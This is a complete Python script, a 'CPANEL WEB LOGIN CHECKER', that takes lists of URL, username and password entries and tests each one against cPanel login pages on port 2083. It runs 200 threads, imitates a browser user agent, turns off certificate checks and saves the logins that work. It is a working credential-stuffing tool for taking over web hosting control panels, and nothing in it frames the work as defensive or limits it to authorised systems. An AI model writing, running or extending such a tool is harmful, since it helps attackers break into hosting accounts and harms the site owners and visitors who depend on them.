#!/usr/bin/env python3

import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from colorama import Fore, init

init(autoreset=True)

INPUT_FILE = "cpanels.txt"
OUTPUT_VALID = "cpanel_valid.txt"

THREADS = 200
TIMEOUT = 15

lock = threading.Lock()

stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "failed": 0,
}


def banner():
    print(Fore.CYAN + r"""
 ██████╗██████╗  █████╗ ███╗   ██╗███████╗██╗
██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔════╝██║
██║     ██████╔╝███████║██╔██╗ ██║█████╗  ██║
██║     ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║
╚██████╗██║     ██║  ██║██║ ╚████║███████╗███████╗
 ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝

             CPANEL WEB LOGIN CHECKER
    """)

    print(Fore.YELLOW + f"Input   : {INPUT_FILE}")
    print(Fore.GREEN + f"Valid   : {OUTPUT_VALID}")
    print(Fore.YELLOW + f"Threads : {THREADS}")
    print()


def parse_line(line):
    """
    Expected:
    https://server.example:2083|username|password
    
    Returns:
        url, username, password
    """
    parts = line.strip().split("|", 2)

    if len(parts) != 3:
        return None

    url = parts[0].strip().rstrip("/")
    username = parts[1].strip()
    password = parts[2].strip()

    if not url or not username or not password:
        return None

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    try:
        parsed = urlparse(url)

        if not parsed.hostname:
            return None

        # Enforce secure HTTPS cPanel port
        if parsed.port is None or parsed.port != 2083:
            url = f"https://{parsed.hostname}:2083"

    except ValueError:
        return None

    return url, username, password


def authenticate_cpanel(line):
    parsed = parse_line(line)

    if parsed is None:
        return "invalid", line, "BAD FORMAT"

    url, username, password = parsed

    # Standard browser headers to emulate a true login sequence
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }

    # Form parameters expected by cPanel login systems
    payload = {
        "user": username,
        "pass": password
    }

    login_endpoint = f"{url}/login/"

    try:
        # Using a session context allows cookies/redirect targets to seamlessly link
        with requests.Session() as session:
            # We explicitly allow redirects here because a successful login 
            # redirects you inside the session panel dashboard where "lblDomainName" lives.
            response = session.post(
                login_endpoint,
                data=payload,
                headers=headers,
                timeout=TIMEOUT,
                verify=False,  # Bypass SSL verify issues common with server IPs/hostnames
                allow_redirects=True,
            )

        # Check if the signature exists anywhere inside the target response page
        if "lblDomainName" in response.text or '{"notices":[]' in response.text:
            return "valid", line, "AUTH OK / Web Interface Access"
        
        # Explicit login rejection signatures or HTTP codes
        if response.status_code in (401, 403) or "login_failed" in response.url:
            return "invalid", line, "CREDENTIALS REJECTED"

        return "invalid", line, "lblDomainName NOT FOUND"

    except requests.exceptions.SSLError:
        return "failed", line, "SSL CERTIFICATE ERROR"

    except requests.exceptions.ConnectTimeout:
        return "failed", line, "CONNECTION TIMEOUT"

    except requests.exceptions.ReadTimeout:
        return "failed", line, "READ TIMEOUT"

    except requests.exceptions.ConnectionError:
        return "failed", line, "CONNECTION ERROR"

    except requests.exceptions.RequestException as e:
        return "failed", line, str(e)


def save_result(filename, line):
    with lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(line + "\n")


def process(line):
    result, original, reason = authenticate_cpanel(line)

    with lock:
        stats["checked"] += 1

        if result == "valid":
            stats["valid"] += 1
        elif result == "invalid":
            stats["invalid"] += 1
        else:
            stats["failed"] += 1

        checked = stats["checked"]
        valid = stats["valid"]
        invalid = stats["invalid"]
        failed = stats["failed"]

    if result == "valid":
        save_result(OUTPUT_VALID, original)
        print(
            Fore.GREEN + f"[+] VALID AUTH  --> {original} " + Fore.WHITE + f"[{reason}]"
        )
    elif result == "invalid":
        print(
            Fore.RED + f"[-] INVALID AUTH --> {original} " + Fore.WHITE + f"[{reason}]"
        )
    else:
        print(
            Fore.YELLOW + f"[!] FAILED      --> {original} " + Fore.WHITE + f"[{reason}]"
        )

    print(
        Fore.CYAN + f"\rChecked: {checked} | "
        + Fore.GREEN + f"Valid: {valid} "
        + Fore.RED + f"| Invalid: {invalid} "
        + Fore.YELLOW + f"| Failed: {failed}",
        end="",
        flush=True,
    )


def main():
    # Quiet warnings regarding unverified HTTPS requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    banner()

    try:
        with open(INPUT_FILE, "r", encoding="utf-8", errors="ignore") as f:
            lines = [
                line.strip()
                for line in f
                if line.strip() and not line.lstrip().startswith("#")
            ]
    except FileNotFoundError:
        print(Fore.RED + f"[!] File not found: {INPUT_FILE}")
        return

    # Start fresh output file for valid entries only
    open(OUTPUT_VALID, "w", encoding="utf-8").close()

    print(Fore.CYAN + f"[•] Loaded {len(lines)} entries\n")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(process, line) for line in lines]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(Fore.RED + f"\n[!] Worker error: {e}")

    print("\n")
    print(Fore.CYAN + "=" * 65)
    print(Fore.GREEN + f"VALID AUTH    : {stats['valid']}")
    print(Fore.RED + f"INVALID AUTH  : {stats['invalid']}")
    print(Fore.YELLOW + f"FAILED        : {stats['failed']}")
    print(Fore.CYAN + f"TOTAL CHECKED : {stats['checked']}")
    print(Fore.CYAN + "=" * 65)
    print(Fore.GREEN + f"\n[+] Valid saved   : {OUTPUT_VALID}")

if __name__ == "__main__":
    main()
